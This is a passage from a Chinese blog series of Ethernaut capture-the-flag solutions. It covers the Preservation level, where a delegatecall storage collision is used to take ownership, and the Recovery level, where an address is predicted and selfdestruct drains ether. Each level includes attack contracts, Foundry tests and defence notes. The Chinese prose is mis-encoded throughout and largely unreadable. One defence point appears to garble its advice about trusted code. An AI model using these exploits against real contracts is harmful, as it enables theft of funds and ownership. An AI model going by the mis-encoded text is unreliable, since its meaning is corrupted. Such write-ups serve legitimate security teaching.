align=\"left\">(æœªä½¿ç”¨)</td>\n</tr>\n<tr>\n<td align=\"left\">3</td>\n<td align=\"left\"><code>storedTime</code></td>\n<td align=\"left\">(æœªä½¿ç”¨)</td>\n</tr>\n</tbody></table>\n<p>å½“ <code>LibraryContract.setTime(uint)</code> è¢« <code>delegatecall</code> è°ƒç”¨æ—¶ï¼Œå®ƒä»¥ä¸ºè‡ªå·±åœ¨ä¿®æ”¹ <code>storedTime</code>ï¼ˆä½äº slot 0ï¼‰ã€‚ä½†å®é™…ä¸Šï¼Œå®ƒä¿®æ”¹çš„æ˜¯ <code>Preservation</code> åˆçº¦çš„ slot 0ï¼Œä¹Ÿå°±æ˜¯ <code>timeZone1Library</code> çš„åœ°å€ï¼</p>\n<p>è¿™å°±ç»™äº†æˆ‘ä»¬ä¸€ä¸ªæ”»å‡»è·¯å¾„ï¼š</p>\n<ol>\n<li><strong>ç¬¬ä¸€æ¬¡è°ƒç”¨ <code>setFirstTime</code></strong>: æˆ‘ä»¬ä¼ å…¥ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„ <code>_timeStamp</code>ï¼Œè¿™ä¸ª <code>_timeStamp</code> å…¶å®æ˜¯æˆ‘ä»¬çš„æ”»å‡»åˆçº¦çš„åœ°å€ã€‚è¿™æ¬¡è°ƒç”¨ä¼šæŠŠ <code>Preservation</code> åˆçº¦çš„ <code>timeZone1Library</code> (slot 0) ä¿®æ”¹ä¸ºæˆ‘ä»¬çš„æ”»å‡»åˆçº¦åœ°å€ã€‚</li>\n<li><strong>åˆ›å»ºæ”»å‡»åˆçº¦</strong>: æˆ‘ä»¬çš„æ”»å‡»åˆçº¦éœ€è¦æœ‰ä¸€ä¸ª <code>setTime(uint)</code> å‡½æ•°ã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªå‡½æ•°çš„å®ç°ä¸æ˜¯ä¸ºäº†è®¾ç½®æ—¶é—´ï¼Œè€Œæ˜¯ä¸ºäº†ä¿®æ”¹ <code>owner</code>ã€‚ä¸ºäº†èƒ½ä¿®æ”¹ <code>owner</code>ï¼ˆä½äº slot 2ï¼‰ï¼Œæˆ‘ä»¬çš„æ”»å‡»åˆçº¦éœ€è¦æœ‰ä¸ <code>Preservation</code> ç›¸ä¼¼çš„å­˜å‚¨å¸ƒå±€ï¼Œä½¿å¾— <code>owner</code> å˜é‡ä¹Ÿä½äº slot 2ã€‚</li>\n<li><strong>ç¬¬äºŒæ¬¡è°ƒç”¨ <code>setFirstTime</code></strong>: ç°åœ¨ <code>timeZone1Library</code> å·²ç»æŒ‡å‘æˆ‘ä»¬çš„æ”»å‡»åˆçº¦ã€‚æˆ‘ä»¬å†æ¬¡è°ƒç”¨ <code>setFirstTime</code>ï¼Œè¿™æ¬¡ä¼ å…¥æˆ‘ä»¬è‡ªå·±çš„åœ°å€ï¼ˆ<code>player</code>ï¼‰ä½œä¸º <code>_timeStamp</code>ã€‚<code>delegatecall</code> ä¼šæ‰§è¡Œæˆ‘ä»¬æ”»å‡»åˆçº¦çš„ <code>setTime</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šå°†ä¼ å…¥çš„ <code>_timeStamp</code> (æˆ‘ä»¬çš„åœ°å€) å†™å…¥ <code>owner</code> å˜é‡ï¼ˆslot 2ï¼‰ï¼Œä»è€Œä½¿æˆ‘ä»¬æˆä¸º <code>owner</code>ã€‚</li>\n</ol>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"æ”»å‡»åˆçº¦ä»£ç \"><a href=\"#æ”»å‡»åˆçº¦ä»£ç \" class=\"headerlink\" title=\"æ”»å‡»åˆçº¦ä»£ç \"></a>æ”»å‡»åˆçº¦ä»£ç </h3><p>æ”»å‡»åˆçº¦çš„å­˜å‚¨å¸ƒå±€å¿…é¡»ä¸ <code>Preservation</code> å…¼å®¹ï¼Œè‡³å°‘åœ¨å‰ä¸‰ä¸ªæ§½ä½ä¸Šæ˜¯è¿™æ ·ã€‚å®ƒçš„ <code>setTime</code> å‡½æ•°è¢«è®¾è®¡ç”¨æ¥ä¿®æ”¹ <code>owner</code>ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ”»å‡»åˆçº¦</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    // ä¿æŒä¸ Preservation åˆçº¦ç›¸åŒçš„å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">    address public timeZone1Library;</span><br><span class=\"line\">    address public timeZone2Library;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\"></span><br><span class=\"line\">    // è¿™ä¸ªå‡½æ•°ç­¾åå¿…é¡»ä¸åº“å‡½æ•°åŒ¹é…</span><br><span class=\"line\">    // ä½†å®ç°æ˜¯æ¶æ„çš„</span><br><span class=\"line\">    function setTime(uint256 _newOwner) public &#123;</span><br><span class=\"line\">        // å½“è¢« delegatecall è°ƒç”¨æ—¶ï¼Œå®ƒä¼šä¿®æ”¹ Preservation åˆçº¦çš„ slot 2</span><br><span class=\"line\">        owner = address(uint160(_newOwner));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/16_Preservation.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ”»å‡»åˆçº¦å®šä¹‰ (åŒä¸Š)</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    address public timeZone1Library;</span><br><span class=\"line\">    address public timeZone2Library;</span><br><span class=\"line\">    address public owner;</span><br><span class=\"line\">    function setTime(uint256 _newOwner) public &#123; owner = address(uint160(_newOwner)); &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PreservationTest is Test &#123;</span><br><span class=\"line\">    Preservation instance;</span><br><span class=\"line\">    Attack attackContract;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²ç›®æ ‡åˆçº¦å’Œæ”»å‡»åˆçº¦</span><br><span class=\"line\">        LibraryContract lib = new LibraryContract();</span><br><span class=\"line\">        instance = new Preservation(address(lib), address(lib));</span><br><span class=\"line\">        attackContract = new Attack();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testAttacker() public &#123;</span><br><span class=\"line\">        vm.startPrank(player, player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ­¥éª¤ 1: å°† timeZone1Library (slot 0) ä¿®æ”¹ä¸ºæ”»å‡»åˆçº¦çš„åœ°å€</span><br><span class=\"line\">        instance.setFirstTime(uint256(uint160(address(attackContract))));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éªŒè¯ timeZone1Library æ˜¯å¦å·²æ›´æ”¹</span><br><span class=\"line\">        assertEq(instance.timeZone1Library(), address(attackContract));</span><br><span class=\"line\"></span><br><span class=\"line\">        // æ­¥éª¤ 2: å†æ¬¡è°ƒç”¨ setFirstTimeï¼Œè¿™æ¬¡ä¼šæ‰§è¡Œæ”»å‡»åˆçº¦çš„ setTime å‡½æ•°</span><br><span class=\"line\">        // å°† owner (slot 2) ä¿®æ”¹ä¸º player çš„åœ°å€</span><br><span class=\"line\">        instance.setFirstTime(uint256(uint160(player)));</span><br><span class=\"line\"></span><br><span class=\"line\">        // éªŒè¯ owner æ˜¯å¦å·²æ›´æ”¹</span><br><span class=\"line\">        assertEq(instance.owner(), player);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>éƒ¨ç½²æ”»å‡»åˆçº¦</strong>: åˆ›å»ºä¸€ä¸ªå…·æœ‰æ¶æ„ <code>setTime</code> å‡½æ•°å’Œå…¼å®¹å­˜å‚¨å¸ƒå±€çš„æ”»å‡»åˆçº¦ã€‚</li>\n<li><strong>ç¬¬ä¸€æ¬¡ <code>setFirstTime</code> è°ƒç”¨</strong>: è°ƒç”¨ <code>setFirstTime</code>ï¼Œå‚æ•°ä¸ºæ”»å‡»åˆçº¦çš„åœ°å€ã€‚è¿™ä¼šåŠ«æŒ <code>timeZone1Library</code> æŒ‡é’ˆã€‚</li>\n<li><strong>ç¬¬äºŒæ¬¡ <code>setFirstTime</code> è°ƒç”¨</strong>: å†æ¬¡è°ƒç”¨ <code>setFirstTime</code>ï¼Œå‚æ•°ä¸º <code>player</code> çš„åœ°å€ã€‚è¿™ä¼šæ‰§è¡Œæ”»å‡»åˆçº¦çš„ä»£ç ï¼Œå°† <code>player</code> çš„åœ°å€å†™å…¥ <code>Preservation</code> åˆçº¦çš„ <code>owner</code> å­˜å‚¨æ§½ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><strong>ä½¿ç”¨ <code>library</code> å…³é”®å­—</strong>: Solidity çš„ <code>library</code> ç±»å‹æ˜¯ä¸“é—¨ä¸ºæ­¤ç±»åŠŸèƒ½è®¾è®¡çš„ã€‚åº“æ˜¯æ— çŠ¶æ€çš„ï¼Œå¹¶ä¸”ä¸èƒ½è¢« <code>delegatecall</code> ç›´æ¥è°ƒç”¨æ¥ä¿®æ”¹çŠ¶æ€ï¼ˆé™¤éä½¿ç”¨äº†ç‰¹å®šçš„æŠ€å·§ï¼‰ã€‚å®ƒä»¬å¯ä»¥é˜²æ­¢å­˜å‚¨å¸ƒå±€å†²çªã€‚</li>\n<li><strong>ç¡®ä¿å…¼å®¹çš„å­˜å‚¨å¸ƒå±€</strong>: å¦‚æœä½ å¿…é¡»ä½¿ç”¨ <code>delegatecall</code> åˆ°ä¸€ä¸ªéåº“åˆçº¦ï¼Œè¯·åŠ¡å¿…ç¡®ä¿ä¸¤ä¸ªåˆçº¦å…·æœ‰å®Œå…¨ç›¸åŒä¸”å…¼å®¹çš„å­˜å‚¨å¸ƒå±€ã€‚ä»»ä½•å·®å¼‚éƒ½å¯èƒ½å¯¼è‡´ä¸¥é‡çš„å®‰å…¨æ¼æ´ã€‚</li>\n<li><strong>ä¸è¦å°† <code>delegatecall</code> æš´éœ²ç»™ç”¨æˆ·è¾“å…¥</strong>: é¿å…è®©ç”¨æˆ·æ§åˆ¶ <code>delegatecall</code> çš„ç›®æ ‡åœ°å€æˆ–å‚æ•°ã€‚<code>delegatecall</code> åº”è¯¥åªç”¨äºä¸å—ä¿¡ä»»å’Œç»è¿‡éªŒè¯çš„ä»£ç è¿›è¡Œäº¤äº’ã€‚</li>\n<li><strong>ä½¿ç”¨ <code>call</code> è€Œä¸æ˜¯ <code>delegatecall</code></strong>: å¦‚æœåªæ˜¯æƒ³è°ƒç”¨å¦ä¸€ä¸ªåˆçº¦çš„å‡½æ•°ï¼Œè€Œä¸éœ€è¦åœ¨å½“å‰åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œè¯·ä½¿ç”¨æ ‡å‡†çš„ <code>call</code>ã€‚<code>call</code> ä¼šåœ¨è¢«è°ƒç”¨åˆçº¦è‡ªå·±çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œä¸ä¼šå½±å“è°ƒç”¨è€…çš„å­˜å‚¨ã€‚</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong><code>delegatecall</code></strong>: EVM ä¸­æœ€å¼ºå¤§çš„æ“ä½œç ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æœ€å±é™©çš„ã€‚å®ƒå…è®¸ä»£ç é‡ç”¨ï¼Œä½†ä¹Ÿå¸¦æ¥äº†å­˜å‚¨æ“çºµçš„é£é™©ã€‚</li>\n<li><strong>å­˜å‚¨å¸ƒå±€ (Storage Layout)</strong>: ç†è§£Solidityå¦‚ä½•å°†å˜é‡å­˜å‚¨åœ¨EVMçš„å­˜å‚¨æ§½ä¸­æ˜¯é«˜çº§æ™ºèƒ½åˆçº¦å®‰å…¨åˆ†æçš„åŸºç¡€ã€‚<code>forge inspect &lt;Contract&gt; storage-layout</code> æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å·¥å…·ã€‚</li>\n<li><strong>ç±»å‹è½¬æ¢</strong>: å°† <code>address</code> è½¬æ¢ä¸º <code>uint</code> æ˜¯æœ¬æ¬¡æ”»å‡»çš„å…³é”®ã€‚<code>uint256(uint160(address))</code> æ˜¯å®ç°è¿™ä¸€ç‚¹çš„æ ‡å‡†æ–¹æ³•ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li><code>delegatecall</code> åœ¨è°ƒç”¨è€…çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œä»£ç ï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥ä¿®æ”¹è°ƒç”¨è€…çš„å­˜å‚¨ã€‚</li>\n<li>å½“è°ƒç”¨è€…å’Œè¢«è°ƒç”¨è€…çš„å­˜å‚¨å¸ƒå±€ä¸åŒ¹é…æ—¶ï¼Œ<code>delegatecall</code> ä¼šå¯¼è‡´æ„æƒ³ä¸åˆ°çš„ã€ç¾éš¾æ€§çš„çŠ¶æ€æŸåã€‚</li>\n<li>åˆçº¦çš„å­˜å‚¨æ§½æ˜¯æŒ‰é¡ºåºåˆ†é…çš„ï¼Œäº†è§£è¿™ä¸ªé¡ºåºæ˜¯é¢„æµ‹ <code>delegatecall</code> å½±å“çš„å…³é”®ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>åˆ©ç”¨ <code>delegatecall</code> å’Œä¸åŒ¹é…çš„å­˜å‚¨å¸ƒå±€æ¥è¦†ç›–åˆçº¦çš„å…³é”®çŠ¶æ€å˜é‡ï¼ˆå¦‚æŒ‡é’ˆæˆ–æ‰€æœ‰è€…åœ°å€ï¼‰ã€‚</li>\n<li>é€šè¿‡ä¸¤æ­¥æ”»å‡»ï¼Œé¦–å…ˆåŠ«æŒä»£ç æ‰§è¡Œæµï¼ˆé€šè¿‡è¦†ç›–åº“åœ°å€ï¼‰ï¼Œç„¶åæ‰§è¡Œæ¶æ„ä»£ç æ¥è·å–æƒé™ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ä¸¥æ ¼é™åˆ¶ <code>delegatecall</code> çš„ä½¿ç”¨ã€‚</li>\n<li>ä¼˜å…ˆä½¿ç”¨ <code>library</code> å…³é”®å­—æ¥åˆ›å»ºæ— çŠ¶æ€çš„è¾…åŠ©åˆçº¦ã€‚</li>\n<li>ç¡®ä¿ <code>delegatecall</code> çš„ç›®æ ‡åˆçº¦å…·æœ‰å…¼å®¹çš„å­˜å‚¨å¸ƒå±€ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://docs.soliditylang.org/en/latest/contracts.html#delegatecall-callcode-and-libraries\">Solidity Docs: Delegatecall &#x2F; Callcode and Libraries</a></li>\n<li><a href=\"https://consensys.net/diligence/blog/2019/09/delegatecall-gotchas/\">Consensys: Delegatecall Vulnerabilities</a></li>\n</ul>\n"},{"title":"Ethernaut Level 17: Recovery - é¢„æµ‹åˆçº¦åœ°å€","date":"2025-01-25T08:30:00.000Z","updated":"2025-01-25T08:30:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"å­¦ä¹ å¦‚ä½•åŸºäºéƒ¨ç½²è€…åœ°å€å’Œ nonce ç¡®å®šæ€§åœ°è®¡ç®—æœªæ¥åˆçº¦çš„åœ°å€ã€‚æ·±å…¥ç†è§£ä»¥å¤ªåŠçš„ RLP ç¼–ç è§„åˆ™å’Œ `keccak256` å“ˆå¸Œåœ¨åœ°å€ç”Ÿæˆä¸­çš„ä½œç”¨ï¼ŒæŒæ¡ Recovery å…³å¡çš„ç ´è§£æŠ€å·§ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 17: Recovery - é¢„æµ‹åˆçº¦åœ°å€\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 17 - Recovery](https://ethernaut.openzeppelin.com/level/17)  \n> **æ”»å‡»ç±»å‹**: åˆçº¦åœ°å€é¢„æµ‹  \n> **éš¾åº¦**: â­â­â­â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\n`Recovery` åˆçº¦é€šè¿‡ `generateToken` å‡½æ•°åˆ›å»ºäº†ä¸€ä¸ª `SimpleToken` åˆçº¦å®ä¾‹ï¼Œå¹¶å‘å…¶å‘é€äº† 0.001 etherã€‚ä½†æ˜¯ï¼Œ`generateToken` å‡½æ•°æ²¡æœ‰è¿”å›æ–°åˆ›å»ºçš„åˆçº¦åœ°å€ã€‚ä½ çš„ç›®æ ‡æ˜¯å–å›è¿™ 0.001 etherã€‚\n\n![Recovery Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel17.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n`SimpleToken` åˆçº¦ä¸­æœ‰ä¸€ä¸ª `destroy` å‡½æ•°ï¼Œå¯ä»¥é”€æ¯åˆçº¦å¹¶å°†ä½™é¢å‘é€åˆ°æŒ‡å®šåœ°å€ã€‚å› æ­¤ï¼Œæœ¬å…³çš„æ ¸å¿ƒæŒ‘æˆ˜åœ¨äºæ‰¾åˆ°è¿™ä¸ªä¸¢å¤±çš„ `SimpleToken` åˆçº¦çš„åœ°å€ã€‚\n\n```solidity\ncontract SimpleToken {\n    // ...\n    function destroy(address payable _to) public {\n        selfdestruct(_to);\n    }\n}\n```\n\nåœ¨ä»¥å¤ªåŠä¸­ï¼Œåˆçº¦çš„åœ°å€å¹¶ä¸æ˜¯éšæœºçš„ï¼Œè€Œæ˜¯å¯ä»¥æ ¹æ®éƒ¨ç½²è€…çš„åœ°å€å’Œå…¶ `nonce` ç¡®å®šæ€§åœ°è®¡ç®—å‡ºæ¥çš„ã€‚å…¶è®¡ç®—å…¬å¼ä¸ºï¼š\n\n`new_address = keccak256(rlp([sender_address, nonce]))`\n\n-   `sender_address`: åˆ›å»ºåˆçº¦çš„è´¦æˆ·åœ°å€ã€‚åœ¨æœ¬ä¾‹ä¸­ï¼Œæ˜¯ `Recovery` åˆçº¦çš„åœ°å€ã€‚\n-   `nonce`: åˆ›å»ºè€…è´¦æˆ·çš„ `nonce`ã€‚å¯¹äºEOAï¼Œ`nonce` æ˜¯å…¶å‘é€çš„äº¤æ˜“æ•°é‡ã€‚å¯¹äºåˆçº¦ï¼Œ`nonce` æ˜¯å®ƒåˆ›å»ºçš„åˆçº¦æ•°é‡ã€‚ç”±äº `Recovery` åˆçº¦æ˜¯ç¬¬ä¸€æ¬¡åˆ›å»º `SimpleToken`ï¼Œæ‰€ä»¥å®ƒçš„ `nonce` æ˜¯1ã€‚\n-   `rlp([...])`: å¯¹å‘é€è€…åœ°å€å’Œ `nonce` è¿›è¡ŒRLPï¼ˆRecursive-Length Prefixï¼‰ç¼–ç ã€‚\n\n### RLP ç¼–ç \n\nRLPç¼–ç è§„åˆ™æ¯”è¾ƒå¤æ‚ï¼Œä½†å¯¹äº `[address, nonce]` è¿™ç§åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥ç®€åŒ–å…¶åœ¨Solidityä¸­çš„æ„é€ ï¼š\n\n`abi.encodePacked(byte(0xd6), byte(0x94), sender_address, byte(0x01))`\n\n-   `0xd6`: RLPå‰ç¼€ï¼Œè¡¨ç¤ºä¸€ä¸ªé•¿åº¦åœ¨0-55å­—èŠ‚ä¹‹é—´çš„åˆ—è¡¨ï¼ˆlistï¼‰ã€‚\n-   `0x94`: RLPå‰ç¼€ï¼Œè¡¨ç¤ºä¸€ä¸ª20å­—èŠ‚çš„å­—ç¬¦ä¸²ï¼ˆstringï¼‰ï¼Œå³åœ°å€ã€‚\n-   `sender_address`: 20å­—èŠ‚çš„éƒ¨ç½²è€…åœ°å€ã€‚\n-   `0x01`: `nonce` ä¸º1çš„RLPç¼–ç ã€‚\n\nå°†è¿™äº›éƒ¨åˆ†æ‰“åŒ…å¹¶è¿›è¡Œ `keccak256` å“ˆå¸Œï¼Œç„¶åå–ç»“æœçš„å20å­—èŠ‚ï¼Œå°±æ˜¯æˆ‘ä»¬ä¸¢å¤±çš„åˆçº¦åœ°å€ã€‚\n\n### åœ¨Solidityä¸­è®¡ç®—åœ°å€\n\næˆ‘ä»¬å¯ä»¥ç¼–å†™ä¸€ä¸ªç®€å•çš„å‡½æ•°æ¥æ‰§è¡Œè¿™ä¸ªè®¡ç®—ï¼š\n\n```solidity\nfunction calculateAddress(address _deployerAddress) public pure returns (address) {\n    uint nonce = 1; // è¿™æ˜¯ _deployerAddress åˆ›å»ºçš„ç¬¬ä¸€ä¸ªåˆçº¦\n    return address(\n        uint160(\n            uint256(\n                keccak256(\n                    abi.encodePacked(\n                        bytes1(0xd6),\n                        bytes1(0x94),\n                        _deployerAddress,\n                        bytes1(nonce)\n                    )\n                )\n            )\n        )\n    );\n}\n```\n\nä¸€æ—¦æˆ‘ä»¬è®¡ç®—å‡º `SimpleToken` çš„åœ°å€ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨å®ƒçš„ `destroy` å‡½æ•°æ¥å–å›ä»¥å¤ªå¸ã€‚\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦/é€»è¾‘\n\næˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª `Attack` åˆçº¦ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå‡½æ•°æ¥ä¸ºæˆ‘ä»¬è®¡ç®—ä¸¢å¤±çš„åˆçº¦åœ°å€ã€‚\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Attack {\n    function calculate(address _deployerAddress) public pure returns (address) {\n        // nonce æ˜¯ 1ï¼Œå› ä¸ºè¿™æ˜¯ _deployerAddress åˆ›å»ºçš„ç¬¬ä¸€ä¸ªåˆçº¦\n        bytes1 nonce = bytes1(0x01);\n\n        address lostContractAddress = address(\n            uint160(\n                uint256(\n                    keccak256(\n                        abi.encodePacked(\n                            bytes1(0xd6),       // RLP prefix for a list\n                            bytes1(0x94),       // RLP prefix for a 20-byte string\n                            _deployerAddress,   // The deployer's address\n                            nonce             // The nonce\n                        )\n                    )\n                )\n            )\n        );\n\n        return lostContractAddress;\n    }\n}\n```\n\n### Foundry æµ‹è¯•ä»£ç \n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/17_Recovery.sol\";\n\n// æ”»å‡»åˆçº¦å®šä¹‰ (åŒä¸Š)\ncontract Attack {\n    function calculate(address _deployerAddress) public pure returns (address) {\n        bytes1 nonce = bytes1(0x01);\n        address lostContractAddress = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), _deployerAddress, nonce)))));\n        return lostContractAddress;\n    }\n}\n\ncontract RecoveryTest is Test {\n    Recovery recoveryInstance;\n    Attack attack;\n    address payable player;\n\n    function setUp() public {\n        player = payable(vm.addr(1));\n        \n        // éƒ¨ç½² Recovery åˆçº¦å¹¶è®©å®ƒåˆ›å»ºä¸€ä¸ª SimpleToken\n        vm.deal(address(this), 0.001 ether);\n        recoveryInstance = new Recovery();\n        recoveryInstance.generateToken{value: 0.001 ether}(\"MyToken\", 100);\n\n        attack = new Attack();\n    }\n\n    function testAttacker() public {\n        vm.startPrank(player, player);\n\n        // æ­¥éª¤ 1: è®¡ç®—ä¸¢å¤±çš„ SimpleToken åˆçº¦åœ°å€\n        address payable lostContract = payable(attack.calculate(address(recoveryInstance)));\n\n        // éªŒè¯ä½™é¢æ˜¯å¦æ­£ç¡®\n        assertEq(lostContract.balance, 0.001 ether);\n\n        // æ­¥éª¤ 2: è°ƒç”¨ destroy å‡½æ•°å–å›èµ„é‡‘\n        SimpleToken(lostContract).destroy(player);\n\n        // éªŒè¯èµ„é‡‘æ˜¯å¦å·²å–å›\n        assertEq(lostContract.balance, 0);\n        // æ³¨æ„: player çš„æœ€ç»ˆä½™é¢ä¼šç•¥ä½äºåˆå§‹å€¼ï¼Œå› ä¸ºæœ‰ gas æ¶ˆè€—\n\n        vm.stopPrank();\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1.  **è·å–éƒ¨ç½²è€…åœ°å€**: ç¡®å®šåˆ›å»º `SimpleToken` çš„åˆçº¦åœ°å€ï¼Œå³ `Recovery` åˆçº¦çš„åœ°å€ã€‚\n2.  **è®¡ç®—åˆçº¦åœ°å€**: ä½¿ç”¨ `keccak256(rlp([deployer_address, nonce]))` å…¬å¼è®¡ç®—å‡º `SimpleToken` çš„åœ°å€ã€‚`nonce` ä¸º1ã€‚\n3.  **è°ƒç”¨ `destroy`**: è·å– `SimpleToken` åˆçº¦çš„å®ä¾‹ï¼Œå¹¶è°ƒç”¨å…¶ `destroy` å‡½æ•°ï¼Œå°†èµ„é‡‘è½¬ç§»åˆ° `player` åœ°å€ã€‚\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n1.  **è¿”å›åˆ›å»ºçš„åˆçº¦åœ°å€**: 